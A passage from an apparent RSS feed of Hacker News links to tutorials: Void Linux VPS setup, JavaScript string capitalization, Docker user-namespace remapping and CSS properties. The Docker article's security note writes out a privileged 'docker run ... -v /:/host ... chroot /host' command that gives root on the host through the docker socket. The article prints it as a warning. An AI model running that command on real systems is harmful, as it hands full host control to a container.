ufw allow <span>22</span> <span># CHANGE THE PORT TO YOUR SSHD PORT IF IT IS NOT 22!</span>
<span># add all the rules you like :)</span>
ufw enable
</code></pre></div><p>dtach and dvtm <sup id="fnref:12"><a href="#fn:12" role="doc-noteref">12</a></sup></p>
<div><pre><code data-lang="sh">xbps-install -S dtach
dtach -A ~/dvtm-session -r winch dvtm
</code></pre></div><hr>
<section role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p><a href="https://suckless.org/sucks/systemd/">https://suckless.org/sucks/systemd/</a> <a href="#fnref:1" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:2" role="doc-endnote">
<p><a href="https://nosystemd.org/">https://nosystemd.org/</a> <a href="#fnref:2" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:3" role="doc-endnote">
<p>#systemdsucks on freenode! <a href="#fnref:3" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:4" role="doc-endnote">
<p><a href="http://galexander.org/systemd_sucks.html">http://galexander.org/systemd_sucks.html</a> <a href="#fnref:4" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:5" role="doc-endnote">
<p><a href="https://news.ycombinator.com/item?id=12589281">https://news.ycombinator.com/item?id=12589281</a> <a href="#fnref:5" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:6" role="doc-endnote">
<p>Building a Raspberry Pi 3B+ full keyboard handheld. <a href="https://0x0f0f0f.github.io/posts/2019/08/building-a-raspberry-pi-3b-full-keyboard-handheld.-part-1/">Part 1</a> <a href="https://0x0f0f0f.github.io/posts/2019/09/building-a-raspberry-pi-3b-full-keyboard-handheld.-part-2/">Part 2</a> <a href="#fnref:6" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:7" role="doc-endnote">
<p><a href="https://alpha.de.repo.voidlinux.org/live/current/">https://alpha.de.repo.voidlinux.org/live/current/</a> <a href="#fnref:7" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:8" role="doc-endnote">
<p><a href="https://docs.voidlinux.org/installation/guides/chroot.html#entering-the-chroot">https://docs.voidlinux.org/installation/guides/chroot.html#entering-the-chroot</a> <a href="#fnref:8" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:9" role="doc-endnote">
<p><a href="https://docs.voidlinux.org/installation/guides/chroot.html#configure-fstab">https://docs.voidlinux.org/installation/guides/chroot.html#configure-fstab</a> <a href="#fnref:9" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:10" role="doc-endnote">
<p><a href="https://www.sshaudit.com/hardening_guides.html">https://www.sshaudit.com/hardening_guides.html</a> <a href="#fnref:10" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:11" role="doc-endnote">
<p><a href="https://launchpad.net/ufw">https://launchpad.net/ufw</a> <a href="#fnref:11" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:12" role="doc-endnote">
<p><a href="https://www.digitalocean.com/community/tutorials/how-to-use-dvtm-and-dtach-as-a-terminal-window-manager-on-an-ubuntu-vps">https://www.digitalocean.com/community/tutorials/how-to-use-dvtm-and-dtach-as-a-terminal-window-manager-on-an-ubuntu-vps</a> <a href="#fnref:12" role="doc-backlink">↩︎</a></p>
</li>
</ol>
</section>

            </div></div>]]>
            </description>
            <link>https://0x0f0f0f.github.io/posts/2020/11/supercharge-your-cloud-1-installing-void-linux-on-hetzner-vpss/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25080543</guid>
            <pubDate>Fri, 13 Nov 2020 09:13:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Capitalize Strings in JavaScript]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25080514">thread link</a>) | @robinvdvleuten
<br/>
November 13, 2020 | https://robinvdvleuten.nl/blog/how-to-capitalize-strings-in-javascript/ | <a href="https://web.archive.org/web/*/https://robinvdvleuten.nl/blog/how-to-capitalize-strings-in-javascript/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>To capitalize a string in Javascript so the first character is in uppercase, we don’t need to add another NPM dependency. We can use plain JavaScript or even CSS if it is solely for presentational purposes.</p><h2 id="tldr">TLDR;</h2><div><pre><code data-lang="js"><span>const</span> <span>chars</span> <span>=</span> <span>'hello'</span>
<span>chars</span><span>[</span><span>0</span><span>].</span><span>toUpperCase</span><span>()</span> <span>+</span> <span>chars</span><span>.</span><span>slice</span><span>(</span><span>1</span><span>)</span> <span>// 'Hello'
</span></code></pre></div><h2 id="walk-through-all-steps">Walk through all steps</h2><p>Let’s see how we can approach this through a couple of common JavaScript functions. First, you have to keep in mind that strings are characters. So another way to write a string, is to create an array of characters that we join together.</p><div><pre><code data-lang="js"><span>const</span> <span>chars</span> <span>=</span> <span>[</span><span>'h'</span><span>,</span> <span>'e'</span><span>,</span> <span>'l'</span><span>,</span> <span>'l'</span><span>,</span> <span>'o'</span><span>].</span><span>join</span><span>(</span><span>''</span><span>)</span> <span>// 'hello'
</span></code></pre></div><h3 id="uppercase-the-first-letter">Uppercase the first letter</h3><p>You can access any character within this array through its index. So if we need the letter <code>e</code> from this array, we can use square brackets to access it at index <code>1</code> (as arrays always start counting their index at <code>0</code>).</p><p>But since the introduction of ECMAScript 5, we can treat strings as an array-like object. And thus access any character from a string in a similar fashion.</p><div><pre><code data-lang="js"><span>// We get the first letter by accessing the character at index zero.
</span><span></span><span>const</span> <span>chars</span> <span>=</span> <span>[</span><span>'h'</span><span>,</span> <span>'e'</span><span>,</span> <span>'l'</span><span>,</span> <span>'l'</span><span>,</span> <span>'o'</span><span>]</span>
<span>chars</span><span>[</span><span>0</span><span>]</span> <span>// 'h'
</span><span></span>
<span>// We get the first letter by using the `charAt()` method with index zero.
</span><span></span><span>const</span> <span>chars</span> <span>=</span> <span>'hello'</span>
<span>chars</span><span>[</span><span>0</span><span>]</span> <span>// 'h'
</span></code></pre></div><p>Now we have the first letter isolated from the rest of the string, we can utilize the <code>String.prototype.toUpperCase()</code> method to convert it to uppercase. This method does not convert the string itself, but returns a new string with all of its characters in uppercase. You can read more about the method at the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/toUpperCase">MDN docs</a>.</p><div><pre><code data-lang="js"><span>const</span> <span>chars</span> <span>=</span> <span>'hello'</span>
<span>chars</span><span>[</span><span>0</span><span>].</span><span>toUpperCase</span><span>()</span> <span>// 'H'
</span></code></pre></div><h3 id="slice-the-rest-of-the-letters">Slice the rest of the letters</h3><p>Next we need to get the rest of string after the first character. As we gonna uppercase the first character and append the rest as is. To get a portion or a slice of an array, we can use the <code>Array.prototype.slice</code> method. This method gives us a slice between a start and end index. Read more about it at the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/slice">MDN docs</a>.</p><p>We already know that we do not want the first character (at index <code>0</code>), so our slice starts at <code>1</code>. Our word has <code>5</code> characters and as an array starts at <code>0</code>, our slice ends at <code>4</code>.</p><div><pre><code data-lang="js"><span>const</span> <span>chars</span> <span>=</span> <span>[</span><span>'h'</span><span>,</span> <span>'e'</span><span>,</span> <span>'l'</span><span>,</span> <span>'l'</span><span>,</span> <span>'o'</span><span>]</span>
<span>chars</span><span>.</span><span>slice</span><span>(</span><span>1</span><span>,</span> <span>4</span><span>)</span> <span>// ['e', 'l', 'l', 'o']
</span></code></pre></div><p>But this will not work if we do not know our string length upfront. So let’s use the <code>Array.prototype.length</code> property to pass the length of our string to the <code>slice</code> method.</p><div><pre><code data-lang="js"><span>const</span> <span>chars</span> <span>=</span> <span>[</span><span>'h'</span><span>,</span> <span>'e'</span><span>,</span> <span>'l'</span><span>,</span> <span>'l'</span><span>,</span> <span>'o'</span><span>]</span>
<span>chars</span><span>.</span><span>slice</span><span>(</span><span>1</span><span>,</span> <span>chars</span><span>.</span><span>length</span><span>)</span> <span>// ['e', 'l', 'l', 'o']
</span></code></pre></div><p>And as it is common to slice arrays till the end, we can even skip passing the length.</p><div><pre><code data-lang="js"><span>const</span> <span>chars</span> <span>=</span> <span>[</span><span>'h'</span><span>,</span> <span>'e'</span><span>,</span> <span>'l'</span><span>,</span> <span>'l'</span><span>,</span> <span>'o'</span><span>]</span>
<span>chars</span><span>.</span><span>slice</span><span>(</span><span>1</span><span>)</span> <span>// ['e', 'l', 'l', 'o']
</span></code></pre></div><p>Now to slice a string, we can use <code>String.prototype.slice</code>. Which is identical to the array’s <code>slice</code> method. You can read more about it in the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/slice">MDN docs</a> as well.</p><div><pre><code data-lang="js"><span>const</span> <span>chars</span> <span>=</span> <span>'hello'</span>
<span>chars</span><span>.</span><span>slice</span><span>(</span><span>1</span><span>)</span> <span>// 'ello'
</span></code></pre></div><p>So let’s now combine both the first uppercase character and the rest of the string.</p><div><pre><code data-lang="js"><span>const</span> <span>chars</span> <span>=</span> <span>'hello'</span>
<span>chars</span><span>.</span><span>charAt</span><span>(</span><span>0</span><span>).</span><span>toUpperCase</span><span>()</span> <span>+</span> <span>chars</span><span>.</span><span>slice</span><span>(</span><span>1</span><span>)</span> <span>// 'Hello'
</span></code></pre></div><p>And that will gives us a capitalized string in JavaScript.</p><h2 id="just-use-css">Just use CSS</h2><p>Please remember though, that if its just for displaying a capitalized text on a web page, you can just use a CSS selector.</p><div><pre><code data-lang="html"><span>&lt;</span><span>style</span><span>&gt;</span>
    <span>.</span><span>capitalize</span> <span>{</span>
        <span>text-transform</span><span>:</span> <span>capitalize</span><span>;</span>
    <span>}</span>
<span>&lt;/</span><span>style</span><span>&gt;</span>

<span>&lt;</span><span>span</span> <span>class</span><span>=</span><span>"capitalize"</span><span>&gt;</span> hello <span>&lt;/</span><span>span</span><span>&gt;</span>
</code></pre></div></div></div>]]>
            </description>
            <link>https://robinvdvleuten.nl/blog/how-to-capitalize-strings-in-javascript/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25080514</guid>
            <pubDate>Fri, 13 Nov 2020 09:10:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Terraform Provider to manage Linux machine via SSH]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25080472">thread link</a>) | @rucciva
<br/>
November 13, 2020 | https://registry.terraform.io/providers/TelkomIndonesia/linux/latest/docs | <a href="https://web.archive.org/web/*/https://registry.terraform.io/providers/TelkomIndonesia/linux/latest/docs">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://registry.terraform.io/providers/TelkomIndonesia/linux/latest/docs</link>
            <guid isPermaLink="false">hacker-news-small-sites-25080472</guid>
            <pubDate>Fri, 13 Nov 2020 09:00:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Use Linux user namespaces to fix permissions in Docker volumes (2017)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25080337">thread link</a>) | @joseluisq
<br/>
November 13, 2020 | https://www.jujens.eu/posts/en/2017/Jul/02/docker-userns-remap/ | <a href="https://web.archive.org/web/*/https://www.jujens.eu/posts/en/2017/Jul/02/docker-userns-remap/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<!-- /.post-info -->      
<p>Not long ago, I publish <a href="https://www.jujens.eu/posts/en/2017/Feb/15/docker-unix-socket/">an article</a> about using Unix sockets with docker. These sockets where in docker volumes so they could be shared between various containers. The key idea was to change the UID and GID of the user that owns the socket in the container so they match those of the user that built the image. The main issue with this approach is that it requires you to build to container with the user that will run it. This makes the solution not portable.</p>
<p>Hopefully, the Linux kernel allows us to use an alternative to map user id inside the container to a predictable user id outside: user id namespaces. According to <a href="https://en.wikipedia.org/wiki/Linux_namespaces">wikipedia</a>: <cite>Namespaces are a feature of the Linux kernel that isolates and virtualizes system resources of a collection of processes. Examples of resources that can be virtualized include process IDs, hostnames, user IDs, network access, interprocess communication, and filesystems. Namespaces are a fundamental aspect of containers on Linux.</cite></p>
<p>For instance, thanks to the PID namespace, a process run inside a container can "think" it has the PID 1 inside a container while in fact it has another one. The same is true with user namespace: a user can "think" it has the 0 uid (root) while it fact it has the 1000 user id (some standard user). This will allow us to be sure for the files in a docker volumes that:</p>
<ul>
<li>All files belonging to the root user in the container will belong to a user of the system that is not root in the host.</li>
<li>All files belonging to other users in the container will be mapped to predictable uid (more on that latter).</li>
</ul>
<div id="configure-docker">
<h2><a href="#id1">Configure docker</a></h2>
<p>Lets configure docker to do all that.</p>
<p>First we either need to start the docker daemon with the <tt><span>--userns-remap</span> USER</tt> flag or make sure the configuration file of the docker daemon (<tt>/etc/docker/daemon.json</tt>) contains something like:</p>
<pre><span>{</span>
  <span>"userns-remap"</span><span>:</span> <span>"USER"</span>
<span>}</span>
</pre>
<p><strong>Notes:</strong></p>
<ol>
<li>In both cases, <tt>USER</tt> must be a valid user of the system (ie present in <tt>/etc/passwd</tt>).</li>
<li>Don't forget to restart the daemon if you have to edit the file.</li>
</ol>
</div>
<div id="configure-the-subordinate-uid-gid">
<h2><a href="#id2">Configure the subordinate uid/gid</a></h2>
<p><a href="http://man7.org/linux/man-pages/man5/subuid.5.html">subuid</a> and <a href="http://man7.org/linux/man-pages/man5/subgid.5.html">subgid</a> are used to specify the user/group ids an ordinary user can use to configure id mapping in a user namespace. They are written like: <tt>username:id:count</tt>. For instance, with <tt>jenselme:100000:65536</tt> it means that user <tt>jenselme</tt> can use 65536 user ids starting at 100000.</p>
<p>This will be used by docker to properly remap uid in the container to the host. For instance, with <tt>jenselme:100000:65536</tt>, a file with a uid of 33 in the container, will be a file with a uid of 100032 in the host. And you will have access to that file. Neat, isn't it?</p>
<p>Now that we've seen the theory, let's configure them properly. First, edit <tt>/etc/subuid</tt> and add (replace <tt>jenselme</tt> by your own user name):</p>
<pre>jenselme:1000:1
jenselme:100000:65536
</pre>
<p>You should be able to understand the second line. The first one is there for a slightly different purpose: make sure that all files created by root belong to the user with uid 1000. That's me on my machine, you should of course use your uid (you can get it with <tt>id <span>-u</span> USER</tt>). Otherwise, they will belong to uid 100000.</p>
<p>Now, edit <tt>/etc/subgid</tt> and add (replace <tt>jenselme</tt> by your own user name):</p>
<pre>jenselme:982:1
jenselme:100000:65536
</pre>
<p>The second line is the name in both cases. I didn't use <tt>jenselme:1000:1</tt> but <tt>jenselme:982:1</tt>. On my machine, 982 is the gui of the docker group (you can get it with <tt>getent group docker</tt>). This means that all files created by root, will belong to me and to the docker group. This "trick" can be handy if for some reason you need to share files with the docker daemon. For instance, software like <a href="https://traefik.io/">traefic</a> may need to read/write to the docker socket. By default, for this socket we have:</p>
<pre>[root@fastolfe ~]# ll /var/run/docker.sock
srw-rw----. 1 root docker 0 Jun 11 18:18 /var/run/docker.sock
</pre>
<p>This means that if in the outside the container the uid of root and its guid are mapped to those of jenselme, traefic won't be able to communicate with the socket because of the permissions of the file. Map the gid of root in the container to the gid of docker in the host allows us to prevent that issue.</p>
<p><strong>Note on security:</strong> Giving access to the docker socket is a problem from a security standpoint since it allows a container to create new containers thus giving it access to the whole host system <em>with root permissions</em>, eg by running <tt>docker run <span>-it</span> <span>-v</span> <span>--privileged</span> <span>-v</span> <span>/:/host</span> <span>--userns=host</span> fedora chroot /host</tt>. That is why SELinux will prevent the docker socket to be mounted in a volume by default. You should be aware of that when you do this. See <a href="http://danwalsh.livejournal.com/74095.html">this</a> for more on that topic.</p>
</div>
<div id="tests">
<h2><a href="#id3">Tests</a></h2>
<p>Now that we are all set, let's start the docker daemon (or restart it).</p>
<p><strong>Note to SELinux users:</strong> You need to append <tt>Z</tt> (capital z) when mounting the volumes, like this: <tt><span>-v</span> <span>$(pwd)/test:/test/:Z</span></tt>. Otherwise, the SELinux context will not be correct and you won't be able to access the volumes from the container. See <a href="https://www.jujens.eu/posts/2015/May/24/docker/#volumes">this docker tip</a>.</p>
<p>The first thing you should notice is that if you had downloaded images or created containers, you will not see them with <tt>docker images</tt> or <tt>docker ps <span>-a</span></tt>. That's because, when user re-mapping is enabled, all images and containers are located in a dedicated subfolder. On my machine, that is <tt>/var/lib/docker/1000.982</tt>.</p>
<p>Now that we know this is expected, let's try things. Run somewhere:</p>
<pre>docker run -it -v "$(pwd)/test:/test/" nginx /bin/bash
</pre>
<p>This will open a bash prompt as root in the container. Go to the volume with <tt>cd /test</tt> and create a file: <tt>touch rootfile</tt>. If you run a <tt>ls <span>-l</span></tt> inside the container, you should see something like:</p>
<pre>root@02a5bcc1757c:/test# ls -l
total 0
-rw-r--r--. 1 root   root 0 Jun 11 16:25 rootfile
</pre>
<p>Let's check the uid and gid to be sure:</p>
<pre>root@02a5bcc1757c:/test# ls -ln
total 0
-rw-r--r--. 1 0 0 0 Jun 11 16:25 rootfile
</pre>
<p>So the file belongs to root and its uid is 0 as well as its gid.</p>
<p>Now run <tt>ls <span>-l</span></tt> in the host:</p>
<pre>▶ ls -l
total 0
-rw-r--r--. 1 jenselme docker 0 Jun 11 18:25 rootfile
</pre>
<p>Let's check the uid and guid:</p>
<pre>▶ ls -ln
total 0
-rw-r--r--. 1   1000 982 0 Jun 11 18:25 rootfile
</pre>
<p>That's correct. Now let's do the same thing wit the <tt><span>www-data</span></tt> user. First, let's give some permissions on the <tt>/test</tt> folder to the <tt><span>www-data</span></tt> user. Since this is just a test, let's run <tt>chmod 777 /test</tt>. Now, switch to this user with <tt>su <span>-s</span> /bin/bash <span>www-data</span></tt>. You should now be in the <tt>/test</tt> directory connected as <tt><span>www-data</span></tt>. Create a file with <tt>touch <span>www-data-file</span></tt>. You should see something like:</p>
<pre>www-data@02a5bcc1757c:/test$ ls -l
total 0
-rw-r--r--. 1 root     root     0 Jun 11 16:36 rootfile
-rw-r--r--. 1 www-data www-data 0 Jun 11 16:38 www-data-file
</pre>
<p>And:</p>
<pre>www-data@02a5bcc1757c:/test$ ls -ln
total 0
-rw-r--r--. 1  0  0 0 Jun 11 16:36 rootfile
-rw-r--r--. 1 33 33 0 Jun 11 16:38 www-data-file
</pre>
<p>As far as the host is concerned, we have:</p>
<pre>▶ ls -l
total 0
-rw-r--r--. 1 jenselme docker 0 Jun 11 18:36 rootfile
-rw-r--r--. 1   100032 100032 0 Jun 11 18:38 www-data-file
</pre>
<p>And</p>
<pre>▶ ls -ln
total 0
-rw-r--r--. 1   1000    982 0 Jun 11 18:36 rootfile
-rw-r--r--. 1 100032 100032 0 Jun 11 18:38 www-data-file
</pre>
<p>Now let's create some files from the host. For instance, let's do <tt>touch <span>www-data-file-from-host</span></tt>. In the host it currently belongs to the current user. Let's see in the container:</p>
<pre>www-data@02a5bcc1757c:/test$ ls -l
total 0
-rw-r--r--. 1 root     root     0 Jun 11 16:36 rootfile
-rw-r--r--. 1 www-data www-data 0 Jun 11 16:38 www-data-file
-rw-r--r--. 1 root     nogroup  0 Jun 11 16:41 www-data-file-from-host
</pre>
<p>It belongs to <tt>root</tt> and <tt>nogroup</tt> as expected (in the host, the file belongs to <tt>jenselme:jenselme</tt> not <tt>jenselme:docker</tt>, hence the <tt>nogroup</tt>, I could run <tt>chown jenselme:docker <span>www-data-file-from-host</span></tt> to fix the gid). If you check the uid and gid, you will see it is also as expected.</p>
<p>Now let's change the owner of <tt><span>www-data-file-from-host</span></tt> to <tt>100032:100032</tt> with <tt>chown 100032:100032 <span>www-data-file-from-host</span></tt> (this must be run as root to prevent an <em>Operation not permitted</em>). I let you check the owner, uid, gid in the container. You can also check that the <tt><span>www-data</span></tt> user can write in the file with <tt>echo 'test' &gt; <span>www-data-file-from-host</span></tt>.</p>
<p>This looks good isn't it? I found however one dark spot in this. If you try to edit <tt><span>www-data-file-from-host</span></tt> or <tt><span>www-data-file</span></tt> in the host, it will fail with <em>permission denied</em>. As far as I understand the subuid and subgid, this is not normal. If someone has an explanation for this, please leave a comment. I see two workarounds for that:</p>
<ol>
<li><p>The basic:</p>
<blockquote>
<ol>
<li>Create a group with id <tt>100032</tt> (as root): <tt>groupadd <span>-g</span> 100032 <span>docker-www-data</span></tt></li>
<li>Add yourself to this group (as root): <tt>usermod <span>-aG</span> <span>docker-www-data</span> jenselme</tt></li>
<li>Disconnect/reconnect or use the <tt>newgrp <span>docker-www-data</span></tt> command to take this change into account.</li>
<li>Give write permission to the group in the container: <tt>chmod g=rw <span>www-data-file</span></tt></li>
<li>Write in the file.</li>
</ol>
<p><strong>Note:</strong> You cannot do anything about the user since you can only have one user id.</p>
</blockquote>
</li>
<li><p>The elegant: use ACL (Access Control List). See the <a href="#external-links">external links</a> section to learn more about ACL. TL;DR, ACLs are a way to extend the standard permissions of the filesystem. With them, you can set permissions for a file or directory with very thin granularity for each users and groups of the system. To enable ACLs, run as root:</p>
<blockquote>
<ol>
<li><p><tt>setfacl <span>-Rdm</span> u:USER:rwX DIR</tt> (replace <tt>USER</tt> by a username and <tt>DIR</tt> by a path to a directory or file). This will:</p>
<blockquote>
<ul>
<li><tt><span>-R</span></tt> recurse on subfolders.</li>
<li><tt><span>-d</span></tt> default to this rule. This means that the ACL will apply to all files and directories created in <tt>DIR</tt> after the <tt>setfacl</tt> was run.</li>
<li><tt><span>-m</span></tt> modify the rule to <tt>u:USER:rwX</tt> that is give to the user (<tt>u:</tt>) <tt>USER</tt> the permissions <tt>rwX</tt>. The capital <tt>X</tt> means <em>give execution permission to all folders and to files that have the execute permissions</em>. This prevent us to make all files executable.</li>
<li>apply to <tt>DIR</tt></li>
</ul>
</blockquote>
</li>
<li><p><tt>setfacl <span>-Rm</span> u:USER:rwX DIR</tt> (replace <tt>USER</tt> by a username and <tt>DIR</tt> by a path to a directory or file). This will apply the ACL rule on the existing files in <tt>DIR</tt>.</p>
</li>
</ol>
</blockquote>
</li>
</ol>
</div>
<div id="bonus">
<h2><a href="#id4">Bonus</a></h2>
<div id="create-files">
<h3><a href="#id5">Create files</a></h3>
<p>If you can't or don't want to create the files (eg logs) when the images is created or when you start the container and be sure the container will be able to …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.jujens.eu/posts/en/2017/Jul/02/docker-userns-remap/">https://www.jujens.eu/posts/en/2017/Jul/02/docker-userns-remap/</a></em></p>]]>
            </description>
            <link>https://www.jujens.eu/posts/en/2017/Jul/02/docker-userns-remap/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25080337</guid>
            <pubDate>Fri, 13 Nov 2020 08:38:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CSS Secrets to Improve Web Designs]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25080203">thread link</a>) | @xxlcloudinc
<br/>
November 13, 2020 | https://codecoda.com/en/blog/entry/16-css-secrets-to-improve-web-designs | <a href="https://web.archive.org/web/*/https://codecoda.com/en/blog/entry/16-css-secrets-to-improve-web-designs">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="description">
<p>Have you long been using CSS to build some attractive web designs and layouts? Are you familiar with how CSS can help rejuvenate a bland webpage to create something enticing? CSS is much more than using those fancy fonts and creating backgrounds. No matter how long you have been using CSS to create powerful designs, there could still be some undiscovered features and CSS properties that you can leverage to take your designs to a whole new level. These lesser-known CSS secrets would allow you to influence content behavior on the websites and enjoy greater freedom when applying creative techniques to various elements like photography.</p>
<p>So, let’s discover some of these lesser-known CSS properties and find out how they could help with your futuristic web designs.</p>
<h2>Things You’ll Need:</h2>
<ul>
<li>A popular web browser and your favorite developer tools; it is recommended that you use Google Chrome or Firefox because they support most CSS features. </li>
<li>A reliable code editor </li>
<li>Some useful assets like fonts and images </li>
</ul>
<p>Once you have these, let’s start by exploring some lesser-known typographical CSS properties. </p>
<h2>Typographical Properties</h2>
<p>Many CSS properties enhance the way text is displayed on a web page. Some lesser-known options include the following: </p>
<h4>1. Text-Stroke</h4>
<p>If you already know about the text strokes used in Adobe Illustrator and some vector-drawing apps, you’d be happy to know that you can use them in CSS too. The text-stroke property can be used in CSS to achieve that same effect. <em>The text-stroke can also be animated using CSS</em> as you can apply the effect on stroke color. Unfortunately, stroke width can’t be animated.</p>
<pre><code>footer h3 {
/*more styles in style.css*/
/*...*/
  -webkit-text-fill-color: transparent;
  -webkit-text-stroke: 2px #000;
}</code></pre>
<h4>2. Gradient Text</h4>
<p>Applying gradient to text isn’t complicated anymore. Here’s a quick demonstration of how that attractive effect could be implemented on your website using WebKit while ensuring that the text still remains selectable and editable.</p>
<pre><code>h2.contact-heading { 
  -webkit-text-fill-color: transparent; 
  -webkit-background-clip: text; 
  background: radial-gradient(#ffbc00, #ff65aa);
}</code></pre>
<h4>3. ::first-letter</h4>
<p>It’s a pseudo-element which can be used for styling the first letter in a block-level element. With this, you can be able to introduce similar effects as in paper and print magazines.</p>
<pre><code>p.intro:first-letter { 
  font-size: 100px; 
  display: block; 
  float: left; 
  line-height: .5; 
  margin: 15px 15px 10px 0; 
}</code></pre>
<h2>Content Control</h2>
<p>Let’s now jump to the CSS properties that allow you to have greater control over your images and text’s behavior depending on their container size or proportion.</p>
<h4>4. Line-Clamp</h4>
<p>This property is useful for truncating text after a particular number of lines. This type of truncation usually requires three properties for it to work.<br>First, you must set the display property to <strong>-webkit-box</strong>. Next, you should set <strong>-webkit-box-orient</strong> or <strong>-webkit-inline-box</strong> to vertical. Lastly, keep the <strong>overflow</strong> value as hidden. If any of these are missing, you won’t be able to clip the content.</p>
<pre><code>p.shortened { 
  display: -webkit-box; 
  -webkit-line-clamp: 3; 
  -webkit-box-orient: vertical; 
  overflow: hidden; 
}</code></pre>
<h4>5. Character Unit</h4>
<p>The text height or width could be limited using CSS character unit property. The <em>ch</em> unit means the character width is the same as that of '0' (the zero character) when written in that same font, and has a specific use when combined with the monospace fonts. When a different font-family is used, it changes as well. You can treat it somewhat like <strong>x-height. </strong>However, the <strong>ch</strong> here is the width of the character '0' rather than that of x.</p>
<pre><code>h2.contact-heading {
  /*more properties in the CSS file*/
  max-width: 8ch;
}</code></pre>
<h4>6. Column-Count</h4>
<p>Using the column-count property in CSS, you direct the browser to distribute content evenly in the number of columns as specified.</p>
<pre><code>.outro {  
  column-count: 2;
}</code></pre>
<h4>7. Shape-Outside</h4>
<p>You can use the shape-outside CSS property to make a curved text effect around a floating image. Basically, the property allows for setting geometric shapes so that the text can flow around in a pre-defined area.</p>
<pre><code>.shape { 
  width: 300px; 
  float: left; 
  shape-outside: circle(50%); 
}</code></pre>
<h4>8. Word Break Tag &lt;wbr&gt;</h4>
<p>Though it’s a CSS tutorial, the &lt;wbr&gt; HTML tag is still worth mentioning here. The Word Break Tag is an HTML element that defines a word break opportunity. It refers to a position within a webpage text where the web browser may break the line. There are situations where it might be quite useful when a word is longer than usual, and you’re afraid that the web browser might break that word in a way, making it inappropriate to read and understand. For instance, a phone number could be too long, and the browser may break it in wrong areas. So, a &lt;wbr&gt; tag could be used to avoid that.</p>
<pre><code>&lt;wbr&gt;+0043&lt;wbr&gt;234-343&lt;wbr&gt;234-234&lt;wbr&gt; </code></pre>
<h4>9. Object Fit</h4>
<p>Frequently, it would be best if you control the image behavior on your web pages, depending on their container size. If you’re looking for a CSS property to achieve that effect, <strong>object-fit</strong> is undoubtedly recommended. The property defines how the content inside a <strong>&lt;video&gt;</strong> or <strong>&lt;img&gt;</strong> tag should be resized so that it fits inside the container perfectly.<br>There are four options available to fit the container’s content: <strong>fill</strong>, <strong>cover</strong>, <strong>contain</strong>, and <strong>scale-down</strong>. For instance, if you have used <strong>cover </strong>as the value of this property, you can size the container’s content so that its aspect ratio preserves while filling the element’s entire content box. </p>
<pre><code>.object-fit { 
  object-fit: cover; 
  height: 400px; 
  width: 100%; 
}</code></pre>
<h4>10. Display: Flex</h4>
<p>Vertically centering an element or text is always considered a problem, but there’s an easy way available to do that in CSS using Flexbox. The <strong>display: flex</strong> property was introduced in the CSS3, and it allows you to align just about any element vertically. Here’s how to do that.</p>
<pre><code>.align-vertically { 
  background: #13b5ea; 
  color: #fff; 
  display: flex; 
  align-items: center; 
  height: 200px; 
}</code></pre>
<p>A Flexbox layout is specified for an element using the <strong>display: flex</strong> property while vertical centering is taken care of using <strong>align-items: center</strong>.</p>
<h2>Decorative &amp; Creative Elements</h2>
<p>Even though there are comprehensive charting functions available through the data visualization libraries such as d3.js, why don’t you try CSS for simple pie charts? Besides, some often-ignored decorative elements could work for adding colors to your website. Let’s try and explore them.</p>
<h4>11. Conic-gradient</h4>
<p>If creating pie charts has always troubled you and you’ve been looking for a way to do that through CSS only, you’ve got your solution here. The conic-gradient function allows you to achieve the results you’re looking for. The function is great for creating an image using a gradient that has pre-set color transitions all rotated around the central point (instead of radiation from a central point, which is usually the case with the radial-gradient).</p>
<pre><code>.piechart { 
  background: conic-gradient(rgb(255, 132, 45) 0% 25%, rgb(166, 195, 209) 25% 56%, #ffb50d  56% 100%); 
  border-radius: 50%; 
  width: 300px; 
  height: 300px; 
}</code></pre>
<h4>12. Transition</h4>
<p>Transition is a very useful CSS property for smooth color change <em>on:hover</em><em>.</em> It helps create hover effects not only on links but other elements as well. These effects are visually appealing and allow for a smooth change of color. Here is one basic implementation of the CSS transition on links.</p>
<pre><code>a { 
 color: #1b80b7; 
 transition: all .2s linear; 
}
a:hover { color: #52bff2; }</code></pre>
<p>You can even use this technique for creating far more advanced and creative hover effects. The transition allows you to animate different properties of an element such as height, width, background, etc.</p>
<h4>13. Counters</h4>
<p>CSS counters allow you to style your numbered lists. With the help of counters, you could adjust your content’s appearance depending on the location it has on a web page. It could be quite a useful hack when it comes to styling your numbered lists.</p>
<p>For implementing CSS counters, you can:</p>
<ul>
